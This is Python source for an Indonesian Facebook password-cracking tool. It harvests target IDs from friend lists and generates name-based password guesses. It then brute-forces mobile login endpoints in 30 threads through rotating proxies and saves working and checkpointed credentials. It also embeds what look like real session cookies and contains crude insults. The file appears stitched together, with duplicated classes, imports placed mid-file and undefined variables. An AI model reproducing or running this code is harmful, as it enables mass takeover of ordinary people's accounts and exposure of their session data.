						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n◕➤ Facebook :Rahem bojezz Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n ◕➤  Login Berhasil Jalankan lagi python itil.py");exit()
			except Exception as e:
				print(" ◕➤ Cookies Mati")
				os.system('rm -rf .cok.txt && rm -rf .token.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print("")
	print(f'[😽] ID: '+str(my_id))
	print(f'[😽] ip : {ip}')
	print('')
	print('[😹] Crack Publik ')
	print('[😺] Crack Follower ')
	print('[🙀] Crack Grup   ')
	print('[😼] Crack File	')
	print('[😾] Keluar (hapus cookie) ')
	_____dhanz__kulbet_____ = input('\n╰─ Pilih : ')
	if _____dhanz__kulbet_____ in ['1']:
		dump_massal()
	elif _____dhanz__kulbet_____ in ['2']:
		crack_file()
	elif _____dhanz__kulbet_____ in ['3']:
		result()
	elif _____dhanz__kulbet_____ in ['4']:
		file_cp()
	elif _____dhanz__kulbet_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('🧑‍✈️Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}🧛Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[😼] Hasil {h}OK{x} Anda ')
	print(f'[🙀] Hasil {k}CP{x} Anda ')
	print(f'[😿] Kembali	')
	kz = input(f'\n🐔Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('🥷 File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' ◕➤Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'☞ %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('[*] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('☞ Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ◕➤File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}◕➤ {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} silahkan enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' ◕➤File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' ◕➤Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' ◕➤%s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'◕➤ %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ◕➤Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('◕➤File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x} ◕➤{h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('◕➤Pilih Yang Bener Kontol ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(' ◕➤pilih berapa target : '))
	except ValueError:
		print('[*] Masukkan Angka , janganHuruff ')
		exit()
	if jum<1 or jum>100:
		print('◕➤Dump Idz Anda Gagal ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' ◕➤Masukkan Idz pertama '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('◕➤ Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'🐔 Idz Terkumpul ☜{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('◕➤Sinyal anda sedang kek peler bapakmu,buluk sekali ')
		back()
	except (KeyError,IOError):
		print(f'◕➤{k} teman tidak Public {x}')
		time.sleep(3)
		back()
#-------------[ CRACK-FROM-FILE ]------------------#
import requests, os, re

M = '\x1b[1;91m' # MERAH
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class cek_cp:

    def __init__(self):
        self.ses=requests.Session()###GANTI COOKIE BUAT CEK OPSI CP DISINI YAK BANG(:###
       # self.cok = open('.cok.txt','r').read()
        self.cok = {"cookie": "datr=5ttbZMXk6wSDehvfDCDKK-33; sb=5ttbZA5hZVHLg3dP-bjQcCJo; m_pixel_ratio=1.8000000715255737; dpr=1.8000000715255737; vpd=v1%3B714x400x1.8000000715255737; wl_cbv=v2%3Bclient_version%3A2248%3Btimestamp%3A1683967444; locale=id_ID; x-referer=eyJyIjoiL3JlZy8%2FcmVmPWRibCZzb2Z0PWhqayIsImgiOiIvcmVnLz9yZWY9ZGJsJnNvZnQ9aGprIiwicyI6Im0ifQ%3D%3D; fr=0MEtw4HPocFJnFpHY.AWWNlprtKm0r23qtpD0iRgovo38.BkX7wh.qu.AAA.0.0.BkYSGX.AWVSmkC-osA; c_user=100092595702656; xs=44%3A1in-fWNqNf4tOw%3A2%3A1684087192%3A-1%3A-1; m_page_voice=100092595702656; wd=400x714;"}
    #    self.cok = {"cookie": "datr=K3ZSZJjiZPQuOKAdNWCb-26M; sb=K3ZSZFyru0-A_sM4HUNU1yQ9; locale=id_ID; vpd=v1%3B652x393x2.75; fr=0OFyUiLl3FUn6Ueg2.AWUeO4Vvljq89B9ymK9J68xowXk.BkUnYr.AT.AAA.0.0.BkUzDy.AWU8JBFfHYE; c_user=100091972127584; xs=24%3AeffxTlKv8Y0bXg%3A2%3A1683173618%3A-1%3A-1; m_page_voice=100091972127584; zsh=ASReQQC3D-qtQnHljc-aBZ0cVV8R4ob_0wQIs-mdaEj60ckm6XRCJi98cPCnsydzJMCJX0heLgg6cCJl-chVOYPWSOlITPiDrCfpMXrC_bia4roaY-wLJwTqHOMHjUaUQcpW4zkUlHwfq9IHsGlDwKEpWFX3rt9ibG4qxInu8Y6SbELuU7kUEy61dWeyGXv8gsOO7AMKfu0FyNVvYuVWIa5pPNDgCYuOiQieT6v5mNtzVwJS0y1bW9wgKTkCgtB8pDN4DzLogoVtr_K7CqxDOIMKRsqRMrNMktie_7OX30yejs3biqtr2mZk-0q9nOg473Ujoy8; m_pixel_ratio=2.75; x-referer=eyJyIjoiL3Byb2ZpbGUucGhwP2Vhdj1BZmJBMVdQS2EzeTBpekJBSDNyR3FXcUlhLWV0S0RWd1FHblViaDZ3dVdDYVNXZVlTZ3ZrcXB6X09YYjEzMlZBaVo4JnBhaXB2PTAiLCJoIjoiL3Byb2ZpbGUucGhwP2Vhdj1BZmJBMVdQS2EzeTBpekJBSDNyR3FXcUlhLWV0S0RWd1FHblViaDZ3dVdDYVNXZVlTZ3ZrcXB6X09YYjEzMlZBaVo4JnBhaXB2PTAiLCJzIjoibSJ9; wd=393x712"}
        self.cek()

def crack_file():
	try:vin = os.listdir('/sdcard/Dhanz-DUMP')
	except FileNotFoundError:
		print('☞ File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] Dhanz-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n☞ Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('☞ Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('☞ Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/Dhanz-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'☞ %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('☞ %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n☞ Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}☞ Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/Dhanz-DUMP/'+geh,'r').read().splitlines()
		except:
			print('☞ File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{puti}')
	print('[🙀] Akun Tua (Not Recomend) ')
	print('[😽] Akun Muda (Lumayan) ')
	print('[😹] Random (Recomend) ')
	print('')
	hu = input('◕➤Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('☞ Pilih Yang Bener Kontooll ')
		exit()
	print(f'')
	print('[01] Mobile ')
	print('[02] Free ')
	print('[03] Touch ')
	print('')
	hc = input(' ◕➤Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print(' ◕➤Pilih Yang Bener Kontol ')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	else:
		method.append('mobile')
	print('')
	pwplus=input('◕➤Tambahkan Password Manual ( y/t) ')
	if pwplus in ['y','Ya']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] Bandung,Jakarta,Karawang[white] '))
		pwku=input('\x1b[0;34m☞ Masukkan Password  : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print("")
	print(f'')
	print(f'[*] Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'[*] Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print('')
	print(f'◕➤mainkan Mode Pesawat Setiap 1000 Idz')
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'06')
					pwv.append(frs+'07')
					pwv.append(frs+'08')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'06')
					pwv.append(frs+'07')
					pwv.append(frs+'08')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			else:
				pool.submit(cracktouch,idf,pwv)
	print('')
	cetak(nel('\t[blue] ☞[green] Crack Selesay , Hasil Hari Ini 🦈[blue] ☜ [white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('>>>Lanjut Crack Kembali ( Y/T ) ? ')
	woi = input('☞ Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}☞{b} Good Bye Dadaahh Jangan Lupa Bersukur{x} ☜ ')
		time.sleep(2)
		exit()
#--------------------[ METODE=DHANZ=KULBET ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r[*] 𝚁𝚊hem bojezz  {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[😼] Email :  {idf} [🙀] Password : {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{H}[😺] Email : {idf} [😹] Password : {pw}|{kukis}\n{ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kukis)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


class cek_cp:

    def __init__(self):
        self.ses=requests.Session()###GANTI COOKIE BUAT CEK OPSI CP DISINI YAK BANG(:###
       # self.cok = open('.cok.txt','r').read()
        self.cok = {"cookie": "datr=5ttbZMXk6wSDehvfDCDKK-33; sb=5ttbZA5hZVHLg3dP-bjQcCJo; m_pixel_ratio=1.8000000715255737; dpr=1.8000000715255737; vpd=v1%3B714x400x1.8000000715255737; wl_cbv=v2%3Bclient_version%3A2248%3Btimestamp%3A1683967444; locale=id_ID; x-referer=eyJyIjoiL3JlZy8%2FcmVmPWRibCZzb2Z0PWhqayIsImgiOiIvcmVnLz9yZWY9ZGJsJnNvZnQ9aGprIiwicyI6Im0ifQ%3D%3D; fr=0MEtw4HPocFJnFpHY.AWWNlprtKm0r23qtpD0iRgovo38.BkX7wh.qu.AAA.0.0.BkYSGX.AWVSmkC-osA; c_user=100092595702656; xs=44%3A1in-fWNqNf4tOw%3A2%3A1684087192%3A-1%3A-1; m_page_voice=100092595702656; wd=400x714;"}
    #    self.cok = {"cookie": "datr=K3ZSZJjiZPQuOKAdNWCb-26M; sb=K3ZSZFyru0-A_sM4HUNU1yQ9; locale=id_ID; vpd=v1%3B652x393x2.75; fr=0OFyUiLl3FUn6Ueg2.AWUeO4Vvljq89B9ymK9J68xowXk.BkUnYr.AT.AAA.0.0.BkUzDy.AWU8JBFfHYE; c_user=100091972127584; xs=24%3AeffxTlKv8Y0bXg%3A2%3A1683173618%3A-1%3A-1; m_page_voice=100091972127584; zsh=ASReQQC3D-qtQnHljc-aBZ0cVV8R4ob_0wQIs-mdaEj60ckm6XRCJi98cPCnsydzJMCJX0heLgg6cCJl-chVOYPWSOlITPiDrCfpMXrC_bia4roaY-wLJwTqHOMHjUaUQcpW4zkUlHwfq9IHsGlDwKEpWFX3rt9ibG4qxInu8Y6SbELuU7kUEy61dWeyGXv8gsOO7AMKfu0FyNVvYuVWIa5pPNDgCYuOiQieT6v5mNtzVwJS0y1bW9wgKTkCgtB8pDN4DzLogoVtr_K7CqxDOIMKRsqRMrNMktie_7OX30yejs3biqtr2mZk-0q9nOg473Ujoy8; m_pixel_ratio=2.75; x-referer=eyJyIjoiL3Byb2ZpbGUucGhwP2Vhdj1BZmJBMVdQS2EzeTBpekJBSDNyR3FXcUlhLWV0S0RWd1FHblViaDZ3dVdDYVNXZVlTZ3ZrcXB6X09YYjEzMlZBaVo4JnBhaXB2PTAiLCJoIjoiL3Byb2ZpbGUucGhwP2Vhdj1BZmJBMVdQS2EzeTBpekJBSDNyR3FXcUlhLWV0S0RWd1FHblViaDZ3dVdDYVNXZVlTZ3ZrcXB6X09YYjEzMlZBaVo4JnBhaXB2PTAiLCJzIjoibSJ9; wd=393x712"}
        self.cek()

    def cek(self):
        cetak(panel("""[white][[red]![white]] untuk mengcek opsi cp pro pastikan hasil result cp tersimpan di folder CP/namafile untuk cek opsi pro ini hasil ok/cek login mbasic free tidak 100% login kecuali akun baru crack cp selain itu bisa jadi password salah/a2f!!!"""))
        cp = []
        try:
            xxx = os.listdir("CP")
            for z in xxx:
                cp.append(z)
        except:pass
        if len(cp)==0:
            exit("Anda Tidak Memiliki Result Silakan Crack Dan Masukan Hasil Cp Ke Dalam CP")
        else:
            xa, xx = {}, 0
            for x in cp:
                try:xz = open(f"CP/{x}").readlines()
                except:continue
                xx+=1
                if xx<100:
                    nom = ""+str(xx)
                    xa.update({str(xx):str(x)})
                    xa.update({nom+"0":str(xx)})
                    print(f'[{nom}] {x} Total Result Cp : {H}{str(len(xz))}{P}')
                 #   print(f"{nom}. {x} total: {str(len(xz))}")
                else:
                    xa.update({str(xx):str(x)})
                    print(f'[{nom}] {x} Total Result Cp : {H}{str(len(xz))}')
                  #  print(f"{nom}. {x} total: {str(len(xz))}")
        file = input(f"[*] Nomor File Cp : ")
        try:ajg = xa[file]
        except KeyError:
            print("input yang bener")
        try:
            fi = open(f"CP/{ajg}").readlines()
        except FileNotFoundError:
            print("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
        for yxz in fi:
            user = yxz.replace("\n", "")
            usez = user.split("|")
            self.log_hasil(usez[0], usez[1])

    def log_hasil(self, user, pasw):
        global oke,cpe
        sys.stdout.write(f"\r[{H}OK:{oke}{P}]—[{K}CP:{cpe}{P}]")
        try:
            link = self.ses.get(f"https://mbasic.facebook.com/{user}/friends", cookies=self.cok).text
            #exit(link)
            cari = re.findall('<h3 class\=\".*?">(.*?)</h3>', link)
            if "mbasic_logout_button" not in str(link):
                exit(f"\n[{M}!{N}] akun tumbal anda terkena checkpoint")
            elif "Anda Diblokir Sementar" in str(link):
                exit(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun")
            elif "/zero/optin/write" in str(link):
                exit(f"\n[{M}!{N}] akun tumbal anda menggunakan free Facebook, silahkan ubah ke mode data.")
            elif "0" in str(len(cari)):
                print(f"\r{K}[CP] {user}|{pasw}{N}")
                open("result/CP.txt", "a").write(f"{user}|{pasw}\n")
                cpe+=1
            else:
                print(f"\r{H}[cek mbasic/free] {user}|{pasw}|{cari[0]}{N}")
                oke+=1
                open("CP/log.txt", "a").write(f"{user}|{pasw}\n")
        except Exception as e:exit(e)

def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ?? %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              🚬 %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

            
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s [%s\033[0m \033[0mpilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,til,O,U,O))
	for file in dirs:
